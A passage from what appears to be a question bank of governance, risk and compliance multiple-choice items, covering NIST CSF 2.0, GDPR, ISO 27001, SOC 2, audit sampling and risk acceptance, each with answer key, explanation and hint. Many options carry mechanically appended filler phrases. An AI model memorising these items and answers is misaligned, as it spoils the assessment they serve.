    id: 533, rank: 0, role: "grc", topic: "NIST CSF Functions", difficulty: "BEGINNER",
    q: "Which list gives the core functions of the NIST Cybersecurity Framework 2.0?",
    options: ["Govern, Identify, Protect, Detect, Respond, Recover, as a general rule","Prevent, Pay, Pray, Pass, and revisit the decision after the next release","Plan, Do, Check, Act","Buy, Build, Test, Sell, and revisit the decision after the next release"],
    correct: 0, why: "CSF 2.0 added Govern to the original five functions.",
    hint: "Six functions."
  },
  {
    id: 534, rank: 0, role: "grc", topic: "Audit Finding Response", difficulty: "BEGINNER",
    q: "An audit finding states that backups were never tested. What is the best management response?",
    options: ["Hide the finding, and review the outcome at the next monthly meeting","Dispute the finding without checking","Wait for next year, and review the outcome at the next monthly meeting","Agree an action plan with an owner and date, and retest the control"],
    correct: 3, why: "Findings need owned and tracked corrective actions.",
    hint: "Plan with owner and date."
  },
  {
    id: 535, rank: 0, role: "grc", topic: "Clean Desk Policy", difficulty: "BEGINNER",
    q: "What is the purpose of a clean desk policy?",
    options: ["To save on cleaning costs","To make the office look modern","To stop sensitive papers and devices being seen or taken, as a general rule","To improve desk comfort"],
    correct: 2, why: "Leaving information unattended creates risk of theft or exposure.",
    hint: "Do not leave it out."
  },
  {
    id: 536, rank: 0, role: "grc", topic: "Password Policy Basics", difficulty: "BEGINNER",
    q: "Which password policy approach is most consistent with current guidance?",
    options: ["Reusing passwords across sites, and review the outcome at the next monthly meeting","Long passphrases checked against breached lists, with MFA, as a general rule","Writing passwords on notes, and review the outcome at the next monthly meeting","Changing complex passwords every 30 days, and revisit the decision after the next release"],
    correct: 1, why: "Modern guidance favours length, screening and MFA over forced frequent changes.",
    hint: "Length and screening."
  },
  {
    id: 537, rank: 0, role: "grc", topic: "Insurance and Risk Transfer", difficulty: "BEGINNER",
    q: "What does buying cyber insurance mainly do?",
    options: ["Guarantees no regulator action","Transfers part of the financial impact of an incident, as a general rule","Prevents incidents","Removes the need for any controls"],
    correct: 1, why: "Insurance shares financial loss but does not replace security controls.",
    hint: "Money, not prevention."
  },
  {
    id: 538, rank: 0, role: "grc", topic: "Security Metrics for Managers", difficulty: "BEGINNER",
    q: "Which measure best helps managers see if patching is working?",
    options: ["Length of the policy","Percentage of critical patches applied within the target time, in most cases","Number of security posters","Number of servers"],
    correct: 1, why: "Timeliness of critical patching shows control effectiveness.",
    hint: "Within target time."
  },
  {
    id: 539, rank: 0, role: "grc", topic: "Shared Responsibility in Outsourcing", difficulty: "BEGINNER",
    q: "A company outsources payroll processing to a provider. Who remains accountable for the protection of employee data?",
    options: ["The employees whose data it is","Nobody, as the data is in another company's system","The company, even though the provider does the work","The provider alone, once a contract is signed"],
    correct: 2, why: "Responsibility can be delegated but accountability for personal data stays with the data controller.",
    hint: "Accountability stays."
  },
  {
    id: 540, rank: 0, role: "grc", topic: "Security Roles", difficulty: "BEGINNER",
    q: "Who should normally own the risk to a business system and approve how it is treated?",
    options: ["The external auditor reviewing the control environment","The vendor who sold the system to the organisation","The business owner of that system","The newest member of the IT helpdesk team"],
    correct: 2, why: "Risk owners are accountable managers who can decide to accept, treat or avoid risk.",
    hint: "Business owns risk."
  },
  {
    id: 541, rank: 0, role: "grc", topic: "Policy Acknowledgement", difficulty: "BEGINNER",
    q: "Why do organisations ask staff to acknowledge key policies?",
    options: ["It lets managers avoid enforcing the policy later","It removes the need for any staff training programme","It proves the policy is technically perfect","It records that staff have read and accepted their duties"],
    correct: 3, why: "Acknowledgement gives evidence that expectations were communicated.",
    hint: "Read and accepted."
  },
  {
    id: 542, rank: 0, role: "grc", topic: "Data Owner Role", difficulty: "BEGINNER",
    q: "What is a data owner responsible for?",
    options: ["Writing every line of the application code, then record the result in the ticket","Installing the servers that store the data, then record the result in the ticket","Cleaning the offices where the data is used","Deciding how data is classified and who may access it"],
    correct: 3, why: "Owners are accountable for the data and its protection level.",
    hint: "Accountable for data."
  },
  {
    id: 543, rank: 0, role: "grc", topic: "Third-Party Questionnaire Exhibit", difficulty: "BEGINNER",
    exhibit: "Question                              Answer\nStaff background screening            Yes\nAnnual security awareness training    Yes\nBackups tested at least twice a year  Yes\nCustomer data encrypted at rest       No\nIncident notification within 72 hours Yes",
    q: "Which answer on this supplier questionnaire is the biggest concern?",
    options: ["No encryption of customer data at rest","Annual security training is carried out","Staff are screened before employment","Backups are tested twice a year"],
    correct: 0, why: "Unencrypted customer data increases the impact of a breach at the supplier.",
    hint: "Look at the No answers."
  },
  {
    id: 544, rank: 0, role: "grc", topic: "Retention Schedule", difficulty: "BEGINNER",
    q: "Why keep a data retention schedule?",
    options: ["To keep records only as long as needed and then delete them","To let each employee choose their own deletion dates, in most cases","To store all records forever for convenience, as a general rule","To avoid keeping any records at all"],
    correct: 0, why: "Retention limits balance legal needs and privacy.",
    hint: "Keep then delete."
  },
  {
    id: 545, rank: 0, role: "grc", topic: "Policy Exception", difficulty: "BEGINNER",
    q: "A manager asks to skip a policy requirement for one project. What is the BEST response?",
    options: ["Document a time-limited exception with risk owner approval","Allow it informally to avoid delaying the project, and revisit the decision after the next release","Change the policy, and nobody notices the difference, in most cases","Refuse all exceptions to every policy forever, as a first step"],
    correct: 0, why: "Informal approval is the runner-up as it is quick, but undocumented exceptions hide risk and have no expiry.",
    hint: "Documented exception."
  },
  {
    id: 546, rank: 0, role: "grc", topic: "Privacy Notice Purpose", difficulty: "BEGINNER",
    q: "What is the purpose of a privacy notice?",
    options: ["To list all passwords used by staff, as a general rule","To advertise the organisation's products","To describe the organisation's server rooms, in most cases","To tell people how their personal data is used"],
    correct: 3, why: "Transparency is a core privacy principle.",
    hint: "Transparency."
  },
  {
    id: 547, rank: 0, role: "grc", topic: "Audit Evidence Types", difficulty: "BEGINNER",
    q: "Which is the strongest type of audit evidence for a control?",
    options: ["A photograph taken by the control owner a year ago","A verbal statement from the control owner","System-generated records produced independently","An email saying the control works"],
    correct: 2, why: "Independent system evidence is more reliable than statements.",
    hint: "System records."
  },
  {
    id: 548, rank: 0, role: "grc", topic: "Security Incident Reporting Duty", difficulty: "BEGINNER",
    q: "What should a member of staff do on noticing a possible security incident?",
    options: ["Wait to see whether it happens again before saying anything","Report it promptly through the agreed channel","Investigate it alone, and fix it without telling anyone","Post a message about it on a public social network"],
    correct: 1, why: "Prompt reporting lets the organisation respond and meet its duties.",
    hint: "Report quickly."
  },
  {
    id: 549, rank: 0, role: "grc", topic: "Segregation of Duties Basics", difficulty: "BEGINNER",
    q: "Why should one person not both approve and make a payment?",
    options: ["It makes payments faster for the supplier","It removes the need for any financial records","It lets the manager avoid reading the invoice","It reduces the risk of fraud and honest error"],
    correct: 3, why: "Splitting duties adds a check on each transaction.",
    hint: "Two people."
  },
  {
    id: 550, rank: 0, role: "grc", topic: "Asset Owner Duty", difficulty: "BEGINNER",
    q: "What is an asset owner expected to do?",
    options: ["Decide how the asset is protected and who may use it","Dispose of the asset without telling anyone, as a general rule","Buy the asset from the supplier at the lowest price, in the first instance","Install the asset in the data centre rack, as a general rule"],
    correct: 0, why: "Ownership brings accountability for protection.",
    hint: "Accountable."
  },
  {
    id: 551, rank: 1, role: "grc", topic: "Statement of Applicability", difficulty: "INTERMEDIATE",
    q: "What does the Statement of Applicability in ISO 27001 record?",
    options: ["Which controls apply and why others are excluded","The list of every employee who has signed the acceptable use policy","The budget approved for the security team over the coming financial year","The results of the last penetration test performed by an outside firm"],
    correct: 0, why: "The SoA lists the Annex A controls selected or excluded, with justification and implementation status.",
    hint: "Applicable controls."
  },
  {
    id: 552, rank: 1, role: "grc", topic: "Risk Scoring Matrix", difficulty: "INTERMEDIATE",
    exhibit: "Risk R-031 Likelihood 4 Impact 5 Score 20\nBands: 1-6 Low | 7-12 Medium | 13-18 High | 19-25 Very high",
    q: "Likelihood is rated 4 and impact is rated 5 on a 5x5 matrix. Which interpretation is correct?",
    options: ["Medium risk that is reviewed only once every few years","Low risk that can be accepted by the system administrator","Very high risk needing prompt treatment","Not scorable until the control owner has been replaced"],
    correct: 2, why: "A score of 20 on a 25-point scale sits in the top band and needs a senior decision and treatment plan.",
    hint: "High times high."
  },
  {
    id: 553, rank: 1, role: "grc", topic: "Breach Notification Timeline", difficulty: "INTERMEDIATE",
    q: "A company confirms a personal data breach likely to risk individuals' rights. Under GDPR, what is the BEST action regarding the regulator?",
    options: ["Notify the supervisory authority within 72 hours of becoming aware","Notify only the customers, and skip the regulator until the investigation closes","Wait for the full forensic report before telling anyone","Notify once the press has asked about it and the story has been published online"],
    correct: 0, why: "Waiting for the full report is the runner-up since facts will be fuller, but the clock runs from awareness and updates can follow.",
    hint: "72 hours from awareness."
  },
  {
    id: 554, rank: 1, role: "grc", topic: "Control Testing Types", difficulty: "INTERMEDIATE",
    q: "An auditor re-performs a reconciliation to confirm it works as described. Which testing method is this?",
    options: ["Inspection of the policy that describes the reconciliation","Inquiry of the control owner, and notes from the discussion","Re-performance, in most cases","Observation of the process being carried out on one day"],
    correct: 2, why: "Re-performance is the auditor independently executing the control to check the result.",
    hint: "Do it again."
  },
  {
    id: 555, rank: 1, role: "grc", topic: "Business Impact Analysis", difficulty: "INTERMEDIATE",
    q: "What does a business impact analysis (BIA) produce?",
    options: ["A list of the vendors that the procurement team has used in the last financial year","A diagram of the office network with every cable shown, in most cases","Critical processes with their recovery priorities and time limits","A ranking of the staff members by how long they have worked"],
    correct: 2, why: "The BIA identifies what matters most and how long it can be unavailable, driving RTO and RPO.",
    hint: "What matters, how fast."
  },
  {
    id: 556, rank: 1, role: "grc", topic: "Compensating Control", difficulty: "INTERMEDIATE",
    q: "A legacy system cannot support MFA required by policy. What is the BEST way to handle this gap?",
    options: ["Switch off the system immediately whatever the impact on the business may be","Approve a time-limited exception with compensating controls","Change the policy, and MFA is no longer required for anything","Ignore the requirement as the system is old"],
    correct: 1, why: "Switching off is the runner-up as it removes the risk, but it may be disproportionate; a managed exception with compensating controls keeps services running.",
    hint: "Managed exception."
  },
  {
    id: 557, rank: 1, role: "grc", topic: "Data Processing Agreement", difficulty: "INTERMEDIATE",
    q: "Why must a controller sign a data processing agreement with a supplier that handles personal data on its behalf?",
    options: ["It lets the supplier use the data for its own marketing, and product research","The law requires written terms on instructions and security, in most cases","It makes the supplier cheaper as the contract replaces its normal price list","It avoids the need for any encryption of data held by the supplier on its servers"],
    correct: 1, why: "GDPR Article 28 requires a contract setting out the processor's obligations.",
    hint: "Required by Article 28."
  },
  {
    id: 558, rank: 1, role: "grc", topic: "International Transfer", difficulty: "INTERMEDIATE",
    q: "A company wants to send personal data of EU residents to a provider in a country without an adequacy decision. What is typically needed?",
    options: ["No action is needed as long as the data is encrypted while it is in transit","Only a verbal agreement between the two companies that is noted in the meeting minutes","A safeguard such as standard contractual clauses and an assessment","A new cookie banner on the website that explains where the servers are located"],
    correct: 2, why: "Transfers need a lawful mechanism and an assessment of local law risks.",
    hint: "Safeguard needed."
  },
  {
    id: 559, rank: 1, role: "grc", topic: "Vendor Risk Tiering", difficulty: "INTERMEDIATE",
    q: "How should a company decide how deeply to assess each supplier?",
    options: ["By the alphabetical order of the supplier names in the procurement system","By the sensitivity of data and criticality of the service","By the size of the supplier's logo","By how friendly the sales contact is"],
    correct: 1, why: "Risk-based tiering focuses effort where a failure would hurt most.",
    hint: "Tier by impact."
  },
  {
    id: 560, rank: 1, role: "grc", topic: "SOC 2 Type Difference", difficulty: "INTERMEDIATE",
    q: "What is the key difference between a SOC 2 Type 1 and a Type 2 report?",
    options: ["They are identical","Type 2 tests operation over a period, Type 1 reviews design at a date","Type 1 covers more countries","Type 2 is shorter to produce, and is meant only for small start-up companies"],
    correct: 1, why: "Type 2 gives evidence that controls worked over time.",
    hint: "Point in time versus period."
  },
  {
    id: 561, rank: 1, role: "grc", topic: "Policy Hierarchy", difficulty: "INTERMEDIATE",
    q: "Where do detailed technical requirements such as password length normally belong?",
    options: ["In the company's mission statement published on the public website","In the marketing plan","In the visitor leaflet","In standards that support the high-level policy"],
    correct: 3, why: "Policies state intent, standards set mandatory detail, and procedures give steps.",
    hint: "Standards."
  },
  {
    id: 562, rank: 1, role: "grc", topic: "DSAR Handling", difficulty: "INTERMEDIATE",
    q: "A person asks the company for a copy of their personal data. What is the BEST response?",
    options: ["Verify identity and reply within the legal time limit","Send the data to whoever emails the request, and the deadline is met","Refuse every request as a matter of policy","Ignore the request until it is repeated"],
    correct: 0, why: "Sending to whoever emails is the runner-up since it is fast, but unverified disclosure is itself a breach.",
    hint: "Verify, then respond."
  },
  {
    id: 563, rank: 1, role: "grc", topic: "Evidence Sampling", difficulty: "INTERMEDIATE",
    q: "An auditor tests 25 of 4,000 access changes. What must be true for the sample to be reliable?",
    options: ["It is the first 25 on the list","It is selected fairly and represents the whole population","It contains only the newest items","It contains only items chosen by the control owner before the audit begins"],
    correct: 1, why: "Biased samples can hide failures, so selection should be random or risk-based and documented.",
    hint: "Fair selection."
  },
  {
    id: 564, rank: 1, role: "grc", topic: "Incident Classification", difficulty: "INTERMEDIATE",
    q: "Which incident should be classified as the most severe?",
    options: ["A blocked phishing email","A lost phone that was remotely wiped within minutes of being reported missing","A failed login by a user","Confirmed theft of unencrypted customer records, in most cases"],
    correct: 3, why: "Confirmed loss of sensitive unprotected data has legal and business impact.",
    hint: "Data and impact."
  },
  {
    id: 565, rank: 1, role: "grc", topic: "NIS2 Obligation", difficulty: "INTERMEDIATE",
    q: "Which duty is a typical requirement for essential entities under NIS2?",
    options: ["Avoid using cloud","Hire an auditor monthly","Publish the full network diagram on the company website for customers to read","Implement risk management measures and report significant incidents"],
    correct: 3, why: "NIS2 requires security measures, management accountability and timely incident reporting.",
    hint: "Measures and reporting."
  },
  {
    id: 566, rank: 1, role: "grc", topic: "DORA Third Party Register", difficulty: "INTERMEDIATE",
    q: "What does DORA require financial entities to maintain about ICT third-party providers?",
    options: ["Nothing, as long as costs are low","A list of the providers' employees' home addresses, as a general rule","A copy of each provider's source code","A register of arrangements with contractual and risk information"],
    correct: 3, why: "A register supports oversight, concentration risk review and regulator reporting.",
    hint: "Register."
  },
  {
    id: 567, rank: 1, role: "grc", topic: "Awareness Metrics", difficulty: "INTERMEDIATE",
    q: "A GRC manager wants to show the awareness programme is working. What is the BEST measure?",
    options: ["Percent of staff who finished the course quickly, in most cases","Trend in phishing report rate and time to report","Number of slides in the course, as a general rule","Number of emails sent"],
    correct: 1, why: "Completion rates are the runner-up since they are easy to count, but they do not show behaviour change.",
    hint: "Behaviour over completion."
  },
  {
    id: 568, rank: 1, role: "grc", topic: "Control Ownership", difficulty: "INTERMEDIATE",
    exhibit: "Control C-77 Quarterly access review | Owner: (none) | Last result: Fail | Previous result: Fail | Remediation date: (none)",
    q: "A control has no named owner and has failed twice. What is the best governance action?",
    options: ["Ask the auditor to fix it, then record the result in the ticket","Wait for the next audit, and review the outcome at the next monthly meeting","Delete the control","Assign an accountable owner and track remediation to closure"],
    correct: 3, why: "Ownership is needed for accountability and follow-up.",
    hint: "Owner first."
  },
  {
    id: 569, rank: 1, role: "grc", topic: "Log Retention Conflict", difficulty: "INTERMEDIATE",
    q: "Security wants to keep logs for 3 years, but privacy rules require minimising personal data. What is the BEST approach?",
    options: ["Define retention by log type with justified periods and restricted access","Keep everything forever, and review the outcome at the next monthly meeting","Let each team choose its own period, until the next scheduled review takes place","Delete all logs weekly, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Keeping everything is the runner-up because it supports investigations, but it breaches minimisation without justification.",
    hint: "Justified retention."
  },
  {
    id: 570, rank: 1, role: "grc", topic: "Risk Acceptance Authority", difficulty: "INTERMEDIATE",
    q: "Who should be able to formally accept a high risk?",
    options: ["A new contractor who joined the project team during the previous week","Any security analyst who happens to be on shift when the risk is raised","The vendor who supplied the system that creates the risk for the business","A senior manager with authority for the affected business area"],
    correct: 3, why: "Acceptance must come from someone accountable for the consequences.",
    hint: "Authority and accountability."
  },
  {
    id: 571, rank: 1, role: "grc", topic: "Privacy by Design", difficulty: "INTERMEDIATE",
    q: "What does privacy by design mean when planning a new application?",
    options: ["Letting developers decide later, and revisit the decision after the next release","Collecting as much data as possible, then record the result in the ticket","Building data minimisation and protection into the design from the start","Adding a cookie banner just before launch, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Privacy considerations are embedded early rather than added afterwards.",
    hint: "Early, not later."
  },
  {
    id: 572, rank: 1, role: "grc", topic: "Audit Independence", difficulty: "INTERMEDIATE",
    q: "Why should internal auditors be independent of the processes they audit?",
    options: ["To avoid the need for training as auditors already know the processes well","To reduce the cost of the audit function by sharing staff with operations teams","To give an objective opinion free from conflicts of interest","To make audits shorter and cheaper for the departments that are being reviewed"],
    correct: 2, why: "Independence supports credible assurance.",
    hint: "Objective view."
  },
  {
    id: 573, rank: 1, role: "grc", topic: "Policy Attestation", difficulty: "INTERMEDIATE",
    q: "Why do organisations ask employees to attest annually that they have read key policies?",
    options: ["It reduces the number of policies","It speeds up logins","It shows awareness and supports accountability","It replaces training"],
    correct: 2, why: "Attestation creates a record that staff acknowledged expectations.",
    hint: "Acknowledge and record."
  },
  {
    id: 574, rank: 1, role: "grc", topic: "Cloud Compliance Evidence", difficulty: "INTERMEDIATE",
    q: "A provider supplies ISO 27001 and SOC 2 reports. What should the customer still do?",
    options: ["Review scope and exceptions and cover its own configuration and data responsibilities, and review the outcome at the next monthly meeting","Nothing, as the reports cover everything","Stop all internal controls","Ask the provider to sign nothing"],
    correct: 0, why: "Provider assurance covers only its scope under shared responsibility.",
    hint: "Scope and shared duties."
  },
  {
    id: 575, rank: 1, role: "grc", topic: "Regulatory Change", difficulty: "INTERMEDIATE",
    q: "A new regulation affects how the company stores personal data. What is the best first GRC action?",
    options: ["Wait for enforcement action, until the next scheduled review takes place","Stop using personal data","Assess applicability and gaps and assign owners, and dates","Ask staff to read the law, and review the outcome at the next monthly meeting"],
    correct: 2, why: "A structured gap assessment turns requirements into tracked actions.",
    hint: "Gap and owners."
  },
  {
    id: 576, rank: 1, role: "grc", topic: "Residual Risk Sign-off", difficulty: "INTERMEDIATE",
    q: "After treatment, residual risk is still above appetite. What should happen?",
    options: ["Escalate for further treatment or formal acceptance by an authorised owner","Close the risk","Lower the score","Delete it from the register, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Risks above appetite cannot be quietly closed or reduced on paper.",
    hint: "Escalate."
  },
  {
    id: 577, rank: 1, role: "grc", topic: "Tabletop Exercise Purpose", difficulty: "INTERMEDIATE",
    q: "What is the main governance value of a tabletop incident exercise?",
    options: ["Training attackers, and revisit the decision after the next release","Testing decisions, roles and communication before a real crisis","Replacing real backups, until the next scheduled review takes place","Measuring server speed"],
    correct: 1, why: "Exercises reveal gaps in plans and decision-making.",
    hint: "Practice decisions."
  },
  {
    id: 578, rank: 1, role: "grc", topic: "Control Framework Mapping", difficulty: "INTERMEDIATE",
    q: "A company must meet ISO 27001, SOC 2 and PCI DSS. What is the most efficient approach?",
    options: ["Ignore overlaps, and revisit the decision after the next release","Map one control set to all frameworks and collect evidence once","Run three separate programmes","Choose one framework only, until the next scheduled review takes place"],
    correct: 1, why: "A unified control framework avoids duplicated work and conflicting controls.",
    hint: "Map once."
  },
  {
    id: 579, rank: 1, role: "grc", topic: "Segregation in Access Review", difficulty: "INTERMEDIATE",
    exhibit: "User: m.hart | Roles: VendorMaster-Create, PaymentRun-Approve | Last review: 2025-09-14 | Status: Approved",
    q: "A user can both create vendors and approve payments in the finance system. How should the review treat this?",
    options: ["As a system feature","As a segregation of duties conflict requiring removal or a compensating control, in most cases","As a minor issue","As normal for senior staff"],
    correct: 1, why: "Combining those rights enables fraud by a single person.",
    hint: "Conflicting rights."
  },
  {
    id: 580, rank: 1, role: "grc", topic: "Security Budget Case", difficulty: "INTERMEDIATE",
    q: "Which argument best supports a request for security funding to the board?",
    options: ["The number of tools competitors use","A list of technical jargon","Risk reduction in business terms with costs and options, in most cases","Fear of audits"],
    correct: 2, why: "Boards decide on risk, cost and benefit, not technology.",
    hint: "Business terms."
  },
  {
    id: 581, rank: 1, role: "grc", topic: "Records of Processing", difficulty: "INTERMEDIATE",
    q: "What does a record of processing activities describe?",
    options: ["The salary of each employee","How many laptops the company owns","The network speed","What personal data is processed, why, by whom and where it goes"],
    correct: 3, why: "Article 30 requires organisations to keep these records.",
    hint: "What, why, who, where."
  },
  {
    id: 582, rank: 1, role: "grc", topic: "Whistleblowing Channel", difficulty: "INTERMEDIATE",
    q: "Why should a company offer a confidential channel for reporting suspected misconduct?",
    options: ["It replaces audits","Staff may fear retaliation and not report problems otherwise","It reduces insurance","It avoids paperwork"],
    correct: 1, why: "Safe reporting routes expose fraud and control failures early.",
    hint: "Confidential and safe."
  },
  {
    id: 583, rank: 1, role: "grc", topic: "Metrics Quality", difficulty: "INTERMEDIATE",
    q: "A dashboard shows 99% of policies reviewed. The board still asks about real risk. What is the BEST improvement?",
    options: ["Add more pages","Remove the dashboard","Report only good news","Add outcome measures such as unresolved high risks and control failure trends, wherever possible"],
    correct: 3, why: "Activity metrics are the runner-up as they look complete, but they do not show exposure; outcome measures do.",
    hint: "Outcomes."
  },
  {
    id: 584, rank: 1, role: "grc", topic: "Contract Security Clauses", difficulty: "INTERMEDIATE",
    q: "Which clause is most important to include in a contract with a supplier handling confidential data?",
    options: ["Free coffee for staff","The supplier's favourite colours","Breach notification duties, audit rights and data return or deletion at exit, in most cases","A long logo license"],
    correct: 2, why: "Contracts must support incident handling, assurance and exit.",
    hint: "Notify, audit, exit."
  },
  {
    id: 585, rank: 1, role: "grc", topic: "BCP Testing", difficulty: "INTERMEDIATE",
    q: "What should be done when a recovery test shows the recovery time objective was missed?",
    options: ["Record the gap, fix the cause and retest","Hide the result, and revisit the decision after the next release","Cancel future tests","Change the objective to match the result without review"],
    correct: 0, why: "Tests exist to find gaps and drive improvement.",
    hint: "Fix and retest."
  },
  {
    id: 586, rank: 1, role: "grc", topic: "Data Mapping Value", difficulty: "INTERMEDIATE",
    q: "Why is a data flow map useful for compliance?",
    options: ["It shows where personal data goes so that risks and obligations can be assessed","It makes the website faster","It replaces the privacy notice","It lists staff passwords"],
    correct: 0, why: "Mapping exposes transfers, processors and storage locations.",
    hint: "Know the flows."
  },
  {
    id: 587, rank: 1, role: "grc", topic: "Security Committee", difficulty: "INTERMEDIATE",
    q: "What is the main purpose of a security governance committee?",
    options: ["Replacing the security team, and revisit the decision after the next release","Approving holiday requests, until the next scheduled review takes place","Giving cross-functional oversight and decisions on risk and priorities","Writing code"],
    correct: 2, why: "Governance forums align security with business and resolve conflicts.",
    hint: "Oversight."
  },
  {
    id: 588, rank: 1, role: "grc", topic: "Control Deficiency Rating", difficulty: "INTERMEDIATE",
    q: "What factor most increases the severity of a control deficiency?",
    options: ["The length of the finding","Likelihood that it allows a material loss and the lack of compensating controls, in most cases","Its alphabetical order","The auditor's mood"],
    correct: 1, why: "Severity reflects potential impact and whether other controls mitigate it.",
    hint: "Impact and mitigation."
  },
  {
    id: 589, rank: 1, role: "grc", topic: "Customer Assurance Requests", difficulty: "INTERMEDIATE",
    q: "A customer asks for a long security questionnaire. What is the best way to scale responses?",
    options: ["Ignore customers, and review the outcome at the next monthly meeting","Refuse all requests, and revisit the decision after the next release","Answer from memory","Maintain a reviewed answer library with evidence and a trust page"],
    correct: 3, why: "A maintained library saves time and ensures consistent accurate answers.",
    hint: "Reusable evidence."
  },
  {
    id: 590, rank: 1, role: "grc", topic: "Exit From a Supplier", difficulty: "INTERMEDIATE",
    q: "A company ends a contract with a cloud supplier that holds its customer data. Which step is essential?",
    options: ["Confirm secure return or deletion of the data with written evidence","Cancel the account, and assume the data has gone","Leave the data with the supplier in case it is needed later","Ask the supplier to email the data to the account manager, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Exit controls ensure data does not remain with a supplier without a legal basis or protection.",
    hint: "Prove deletion."
  },
  {
    id: 591, rank: 1, role: "grc", topic: "Control Test Results Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Control: User access removed within 24h of leaver notice\nSample: 25 leavers  Exceptions: 9 (36%)\nLongest delay: 19 days\nCompensating review: none",
    q: "What should the auditor conclude from this control test result?",
    options: ["The control is fully effective and needs no further action from the owner this year","The control should be removed from the framework as it has too many exceptions","The control is not operating effectively and needs remediation","The sample was too small to draw any conclusion about how the control operates"],
    correct: 2, why: "A high exception rate indicates the control is not working as designed.",
    hint: "Look at the exception rate."
  },
  {
    id: 592, rank: 1, role: "grc", topic: "Vendor Tiering", difficulty: "INTERMEDIATE",
    q: "Why classify suppliers into risk tiers?",
    options: ["So that due diligence is proportionate to risk","So that all suppliers receive identical checks, as a general rule","So that suppliers can choose their own tier","So that low-risk suppliers are never reviewed"],
    correct: 0, why: "Tiering focuses effort on suppliers that matter most.",
    hint: "Proportionate."
  },
  {
    id: 593, rank: 1, role: "grc", topic: "Audit Finding Rating Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Ref  Finding                                               Rating\n1    Privileged access not reviewed for 18 months           ?\n2    Two staff missed optional training                     ?\n3    Policy cover page shows old logo                       ?\n4    One meeting minute missing a date                      ?",
    q: "Which finding in this audit summary should be escalated first?",
    options: ["One meeting minute is missing a date, and should be corrected by the secretary soon","The policy cover page has the old logo and needs a new template from the design team","Two staff did not complete optional training that the company offers each autumn","Privileged access reviews have not been performed for 18 months"],
    correct: 3, why: "Unreviewed privileged access is a high-impact control failure.",
    hint: "Impact first."
  },
  {
    id: 594, rank: 1, role: "grc", topic: "Data Subject Request", difficulty: "INTERMEDIATE",
    q: "A customer asks what personal data a company holds about them. What should happen?",
    options: ["Ignore the request as it is inconvenient","Ask the customer to submit the request in person only, as soon as practical","Send all company data about every customer, and revisit the decision after the next release","Verify the identity and respond within the legal time limit"],
    correct: 3, why: "Individuals have rights and requests must be handled lawfully.",
    hint: "Verify and respond."
  },
  {
    id: 595, rank: 1, role: "grc", topic: "Security Governance Roles", difficulty: "INTERMEDIATE",
    q: "Who should be ultimately accountable for information risk?",
    options: ["The supplier of the firewall","The external auditor","The newest member of the IT team","Senior management or the board"],
    correct: 3, why: "Accountability sits with leadership.",
    hint: "Leadership."
  },
  {
    id: 596, rank: 1, role: "grc", topic: "Compliance Mapping Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Requirement                       Control      Status\nAccess control policy             AC-01        Tested\nIncident response plan            IR-02        Tested\nEncryption of backups             -            -\nLogging and monitoring            LM-04        Tested",
    q: "What does this mapping show about the control gap?",
    options: ["No control currently covers encryption of backups","The mapping covers physical security only, and says nothing about technical controls","The requirement list is incomplete, and should be reissued by the compliance team","All requirements have a tested control that the owners review once every quarter"],
    correct: 0, why: "An empty control column identifies a gap.",
    hint: "Find the blank."
  },
  {
    id: 597, rank: 1, role: "grc", topic: "Above-Appetite Risk Acceptance", difficulty: "INTERMEDIATE",
    q: "Who should formally accept a residual risk that is above appetite?",
    options: ["A senior owner with authority over the affected business area","Any employee who has time to sign it","The supplier who sold the control","The analyst who found it during the review"],
    correct: 0, why: "Acceptance needs authority and accountability.",
    hint: "Senior owner."
  },
  {
    id: 598, rank: 1, role: "grc", topic: "Control Owner Duties Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "ID    Control                        Owner     Last test\nAC-01 Joiner mover leaver process    HR Ops    2025-09-14\nAC-07 Privileged access review       -         2024-02-10\nBC-02 Backup restore test            IT Ops    2025-10-01\nLM-03 Log review                     -         never",
    q: "What is the main concern in this control register extract?",
    options: ["The register is stored in a protected system","Several controls have no named owner and no recent test","Every control has an owner, and a recent test","All controls are automated and monitored"],
    correct: 1, why: "Controls without owners or testing are unlikely to operate.",
    hint: "Owner and test date."
  },
  {
    id: 599, rank: 1, role: "grc", topic: "Contract Review Trigger", difficulty: "INTERMEDIATE",
    q: "When should a contract with a supplier handling personal data be reviewed for security terms?",
    options: ["Before signing and at renewal or when the service changes","Never as contracts cannot be changed","Only when the supplier asks for a review, as a general rule","Only after a breach has occurred"],
    correct: 0, why: "Reviews at key moments keep terms aligned to risk.",
    hint: "Before and at change."
  },
  {
    id: 600, rank: 1, role: "grc", topic: "Policy Awareness Check", difficulty: "INTERMEDIATE",
    q: "Staff rarely read a long security policy. What is the BEST way to improve awareness?",
    options: ["Remove the policy and there is nothing to read","Fine staff who have not read it","Send the full policy to staff every day","Provide short role-based guidance with periodic reminders and checks"],
    correct: 3, why: "Daily sending is the runner-up as it repeats the message, but it creates fatigue and little understanding.",
    hint: "Short and relevant."
  },
  {
    id: 601, rank: 2, role: "grc", topic: "Annualised Loss Expectancy", difficulty: "ADVANCED",
    q: "A single loss event costs 200,000 and is expected twice every ten years. What is the annualised loss expectancy?",
    options: ["400,000, as the cost is doubled every year","20,000, as the event happens ten times in two years","2,000,000, as the cost and frequency are multiplied","40,000, as a general rule"],
    correct: 3, why: "ALE is single loss expectancy multiplied by annual rate of occurrence: 200,000 x 0.2 = 40,000.",
    hint: "SLE times ARO."
  },
  {
    id: 602, rank: 2, role: "grc", topic: "Audit Opinion on Access Review", difficulty: "ADVANCED",
    exhibit: "Control AC-04 Quarterly access review\nSample size: 25 | Completed with evidence: 21 | Missing evidence: 4\nTolerable deviation: 0 for key controls",
    q: "An auditor tests 25 quarterly access reviews and finds 4 were not completed. Which conclusion is the best supported?",
    options: ["The control did not operate effectively, so report a deficiency","The control is effective as most reviews were done on time, and on schedule","The result is unknown until all four thousand users have been individually checked","No finding is needed as the sample was small, and incomplete for the whole year"],
    correct: 0, why: "A 16 percent exception rate exceeds typical tolerance, so the control operating effectiveness is rated deficient.",
    hint: "Exceptions in the sample."
  },
  {
    id: 603, rank: 2, role: "grc", topic: "SOC 2 Exception Impact", difficulty: "ADVANCED",
